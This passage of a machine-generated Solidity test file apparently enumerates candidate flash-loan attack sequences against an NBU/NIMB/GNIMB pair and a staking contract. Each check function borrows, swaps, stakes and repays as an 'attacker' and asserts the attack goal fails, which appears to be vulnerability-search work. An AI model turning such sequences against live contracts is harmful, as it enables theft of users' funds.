        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1398(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1399(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1400(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1401(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1402(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1403(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1404(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1405(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1406(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1407(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1408(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1409(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1410(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1411(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1412(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1413(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1414(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1415(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1416(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1417(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1418(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1419(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1420(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1421(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1422(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1423(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1424(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1425(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1426(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1427(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1428(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1429(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nbu(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1430(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nbu(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1431(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1432(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1433(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1434(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1435(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1436(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1437(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1438(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1439(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1440(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1441(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1442(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1443(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1444(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1445(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1446(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1447(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1448(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1449(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
